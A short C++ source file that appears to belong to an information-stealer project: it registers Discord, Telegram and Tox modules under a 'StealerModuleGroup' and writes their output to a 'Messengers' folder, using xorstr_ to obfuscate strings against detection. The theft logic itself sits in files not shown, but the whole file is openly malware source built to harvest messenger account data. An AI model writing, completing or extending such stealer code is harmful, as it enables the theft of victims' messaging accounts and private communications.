//
// Created by .1qxz on 07.06.2024.
//

#include "Messengers.h"
#include "impl/Discord.h"
#include "impl/Telegram.h"
#include "impl/Tox.h"

Messengers::Messengers()
{
    this->modules.push_back(new Discord());
    this->modules.push_back(new Telegram());
    this->modules.push_back(new Tox());
}

void Messengers::execute(fs::path &root) {
    fs::path socials_path = root / xorstr_("Messengers");
    StealerModuleGroup::execute(socials_path);
}
